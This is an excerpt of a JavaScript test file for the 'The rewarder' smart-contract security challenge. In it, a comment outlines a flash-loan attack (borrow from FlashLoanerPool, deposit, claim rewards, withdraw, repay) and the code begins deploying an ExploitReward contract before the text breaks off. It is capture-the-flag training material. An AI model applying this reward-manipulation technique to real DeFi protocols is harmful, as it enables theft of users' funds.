...
const { verifyMessage, mnemonicToEntropy } = require("ethers/lib/utils");
...
describe('[Challenge] The rewarder', function () {
  ...
  it("Execution", async function () {
    ...
    /**
     * The trick will be to ask for the biggest amount of tokens from the
     * FlashLoanerPool, deposit them and claim rewards.
     * 1. Create contract receiver.
     * 2. Ask FlashLoanerPool for a flashloan.
     * 3. Deposit.
     * 4. Claim rewards.
     * 5. Withdraw.
     * 6. Return tokens to FlashLoanerPool
     */

    const ExploitRewardFactory = await ethers.getContractFactory(
      "ExploitReward",
      player
    );
    const exploitReward = await ExploitRewardFactory.deploy(
